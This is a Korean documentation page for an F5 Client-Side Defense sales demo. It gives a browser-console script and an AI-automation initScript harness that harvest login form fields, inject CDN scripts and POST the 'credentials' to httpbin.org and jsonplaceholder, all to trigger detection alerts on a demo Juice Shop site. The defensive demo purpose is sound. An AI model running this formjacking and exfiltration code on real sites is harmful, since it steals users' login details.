@@ -1,0 +1,231 @@
+---
+title: 트리거 감지
+description: '공격 감지 트리거, 임계값 튜닝 및 신호 검증'
+sidebar:
+  order: 6
+  label: 트리거 감지
+i18n:
+  sourceHash: 3c5915b65966
+  translator: machine
+---
+
+import { Aside, Code, Steps } from "@astrojs/starlight/components";
+import Screenshot from "@f5xc-salesdemos/docs-theme/components/Screenshot.astro";
+
+export const combinedScript = `// CSD Demo — Combined Detection Script
+// Triggers ALL CSD detection signals: field reads, script injection, exfiltration
+(function() {
+    console.log('='.repeat(50));
+    console.log('[CSD Demo] Combined Detection Script — Starting');
+    console.log('='.repeat(50));
+
+    // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
+    console.log('\\n[Formjack] Phase 1: Form field harvesting');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+    });
+    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+    // Phase 2: Inject third-party scripts from 4 CDN domains
+    console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() {
+            console.log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url);
+        };
+        document.head.appendChild(script);
+        console.log('[Supply Chain] Injected script tag: ' + cdn.name);
+    });
+
+    // Phase 3: Exfiltrate harvested data to external endpoints
+    console.log('\\n[Exfil] Phase 3: Data exfiltration');
+    var payload = JSON.stringify({
+        type: 'combined_demo',
+        credentials: harvested,
+        page: window.location.href,
+        timestamp: Date.now()
+    });
+
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to www.httpbin.org');
+    });
+
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+    });
+
+    // Summary
+    console.log('\\n' + '='.repeat(50));
+    console.log('[CSD Demo] Simulation complete');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
+    console.log('='.repeat(50));
+})();`;
+
+## 트리거 감지
+
+CSD는 브라우저 내부의 JavaScript 동작을 모니터링합니다. WAF 또는 Bot Defense와 달리 curl 명령으로는 CSD 감지를 트리거할 수 없으며, 실제 브라우저 측 스크립트 활동이 필요합니다. 다음 결합 스크립트는 단일 실행으로 CSD의 세 가지 감지 신호를 모두 트리거합니다: 양식 필드 수집, 여러 CDN 도메인에서의 타사 스크립트 주입, 외부 엔드포인트로의 데이터 유출.
+
+### 결합 시뮬레이션 스크립트 실행
+
+<Steps>
+1. `https://botdemo.sales-demo.f5demos.com/#/login`의 Juice Shop **로그인 페이지**로 이동합니다.
+
+2. 양식 필드에 더미 자격 증명을 입력합니다 — **이메일** 필드에 `test@example.com`을 입력하고 **비밀번호** 필드에 `P@ssword123`을 입력합니다(양식을 제출하지 마세요).
+
+3. DevTools를 엽니다(**F12** → **Console** 탭).
+
+   <Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="스크립트 입력을 위한 빈 DevTools 콘솔" />
+
+4. 다음 스크립트를 콘솔에 붙여넣고 **Enter**를 누릅니다 — 자체 실행 함수로 자동 실행됩니다.
+
+   <Code code={combinedScript} lang="js" title="결합 감지 스크립트" />
+
+5. 각 단계를 확인하는 단계별 `[CSD Demo]` 콘솔 출력을 관찰합니다: 필드 수집, 4개 CDN 도메인에서의 스크립트 주입, 데이터 유출. `esm.sh`는 ES 모듈 구문(`export default …`)을 제공합니다 — 클래식 `<script>` 태그로 로드될 때 `Uncaught SyntaxError: Cannot use import statement outside a module`이 발생합니다. 이는 예상된 동작이며 CSD 감지에 영향을 주지 않습니다(스크립트 태그는 여전히 주입되고 네트워크 요청은 여전히 이루어집니다).
+
+   <Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="시뮬레이션 스크립트 실행 후 콘솔 출력" />
+</Steps>
+
+### AI 자동화 실행
+
+브라우저 자동화 도구(MCP Chrome DevTools, Playwright, Puppeteer)를 가진 AI 어시스턴트는 위의 수동 단계를 따르는 대신 시뮬레이션을 프로그래밍 방식으로 실행합니다:
+
+1. **initScript로 탐색** — 먼저 `about:blank`로 탐색하여 깨끗한 문서 컨텍스트를 보장한 다음, `navigate_page`를 로그인 페이지 URL(예: `http://$F5XC_DOMAINNAME/#/login`)로 이동합니다. 이때 `initScript`를 사용하여 zone.js가 네이티브 `setInterval`, `clearInterval`, `fetch`, `console.log`를 패치하기 전에 저장하고, 로그인 양식 필드를 폴링하고, 네이티브 `HTMLInputElement.prototype.value` setter를 통해 자격 증명을 채우고, 결합 감지 스크립트를 즉시 인라인으로 실행합니다. 아래의 축어적 initScript를 사용합니다.
+2. **환영 배너 해제** — `press_key`를 `Escape`로 눌러 환영 배너를 닫습니다. 후속 방문 시 배너가 나타나지 않을 수 있습니다(쿠키 유지됨).
+3. **완료 대기** — 모든 CDN 스크립트 로드/오류 콜백 및 fetch 약속 해결이 완료될 때까지 10초 대기합니다.
+4. **증거 캡처** — `list_console_messages`를 사용하여 `[CSD Demo] Simulation complete` 확인; `list_network_requests`를 `script` 및 `fetch` 유형으로 필터링하여 HTTP 상태 코드 확인.
+
+**initScript 하네스(축어적 — 자동화된 실행을 위해 결합 감지 스크립트 래핑):**
+
+```javascript
+// zone.js가 패치하기 전에 네이티브 참조 저장
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// 로그인 양식 필드 폴링, 자격 증명 입력, 감지 스크립트 실행
+var _poll = _si(function() {
+  var emailEl = document.querySelector('input[type="email"]');
+  var passEl  = document.querySelector('input[type="password"]');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // 네이티브 setter를 통해 자격 증명 입력 (zone.js 우회)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // 네이티브 fetch를 사용하여 인라인 결합 감지 스크립트 실행
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+**네이티브 `fetch`에 대한 참고:** 이 하네스는 zone.js 오류를 피하기 위해 `window.fetch.bind(window)`를 저장합니다. 이것이 모든 공격 시뮬레이션 단계에 대한 올바른 동작입니다. CSD 완화는 스크립트 로딩을 차단하며(`<script>` 태그 `src` 값 지우기), `fetch()` 호출을 차단하지 않으므로 네이티브 fetch 참조를 저장해도 완화 동작에 영향을 주지 않습니다. 동일한 initScript가 Phase 2 및 Phase 3에 사용됩니다.
+
+<Aside type="caution">
+**zone.js 호환성 문제** — Juice Shop은 Angular의 zone.js를 사용하여 `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` 및 기타 브라우저 API를 패치합니다. 이로 인해 `Cannot read properties of undefined (reading 'call')`과 함께 MCP `evaluate_script`, `fill`, `click` 도구가 작동하지 않습니다. 대신 `navigate_page`와 함께 `initScript`를 사용합니다 — `initScript`는 zone.js가 로드되기 전에 실행되므로 네이티브 API 참조를 저장할 수 있습니다. initScript는 네이티브 `HTMLInputElement.prototype.value` setter(not `fill` tool)를 사용하여 양식 필드를 채우고 `setInterval` 콜백 내에서 감지 스크립트를 인라인으로 실행해야 합니다.
+</Aside>
+
+<Aside type="note">
+**initScript 누적** — `initScript` 매개변수가 있는 각 `navigate_page` 호출은 해당 브라우저 컨텍스트의 후속 모든 문서 로드에서 실행되는 지속적인 목록에 스크립트를 추가합니다. 오래된 스크립트가 간섭하는 것을 피하려면 실행 사이에 `about:blank`로 탐색하거나 깨끗한 컨텍스트를 위해 `isolatedContext`와 함께 `new_page`를 사용합니다.
+</Aside>
+
+브라우저 자동화 도구가 없는 운영자는 위의 수동 단계를 사용합니다.
+
+<Aside type="tip">
+감지는 CSD 대시보드에 나타나는 데 **5-10분**이 걸립니다. 스크립트 실행 후 경고가 아직 표시되지 않으면 [CSD 콘솔 안내](/csd/csd-console/)를 계속 진행하고 나중에 다시 확인합니다.
+</Aside>
+
+### 스크립트의 작동 원리
+
+결합 시뮬레이션은 CSD의 세 가지 감지 신호를 모두 트리거합니다:
+
+| 동작 | 스크립트가 수행하는 작업 | CSD가 감지하는 것 |
+| --- | --- | --- |
+| **필드 수집** | 기존 `input` 요소(이메일, 비밀번호)에서 값을 읽습니다. | 민감한 양식 필드를 읽는 스크립트 — 높은 위험도로 표시됨 |
+| **스크립트 주입** | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`에서 로드하는 4개의 `<script>` 태그를 추가합니다. | 페이지의 4개 새로운 타사 스크립트 도메인 |
+| **데이터 유출** | `fetch`를 통해 수집된 데이터를 `www.httpbin.org` 및 `jsonplaceholder.typicode.com`로 전송합니다. | 외부 도메인으로의 네트워크 호출(참고: fetch 대상은 네트워크 도메인 뷰가 아닌 스크립트 네트워크 상호작용으로 표시됨) |
+
+<Aside type="note">
+CSD에는 특정 감지 경계가 있습니다 — 예를 들어 페이지 로드 DOM 필드만 추적되고 네트워크 뷰는 스크립트 로드 도메인만 표시됩니다. 전체 목록은 [감지 경계](/csd/overview/#detection-boundaries)를 참조합니다.
+</Aside>
+
+### 고급 시뮬레이션
+
+위의 결합 스크립트는 대부분의 데모에 적합한 간단한 3단계 버전(수집, 주입, 유출)입니다. [공격 스크립트 라이브러리](/csd/attack-scripts/)는 공격 유형별로 구성된 10개의 목표 스크립트를 제공합니다. 여기에는 결합 스크립트의 커버리지 위에 DOM 조작, 쿠키 유출, 이미지 비콘 채널을 추가하는 **최대 감지** 스트레스 테스트가 포함됩니다. 개별 스크립트를 사용하여 특정 공격 범주(양식 잭킹, 디지털 스키밍, 공급망 주입, 데이터 유출, DOM 조작)를 격리하여 시연합니다.
